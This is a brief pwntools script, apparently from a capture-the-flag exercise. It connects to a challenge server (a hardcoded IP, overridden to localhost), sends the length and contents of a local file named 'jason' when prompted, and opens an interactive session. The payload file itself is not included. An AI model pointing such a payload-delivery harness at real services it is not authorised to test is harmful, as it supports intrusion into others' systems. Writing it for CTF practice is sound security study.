#!/usr/bin/python
from pwn import *

host = '52.198.163.80'
port = 31733
host = 'localhost'
port = 4000


r = remote(host, port)

f = open('jason', 'rb')
x = f.read()
f.close()

r.recvuntil('Length?')
r.sendline(str(len(x)))
y = r.recvuntil('Data?')
print (y)
r.sendline(x)


r.interactive()
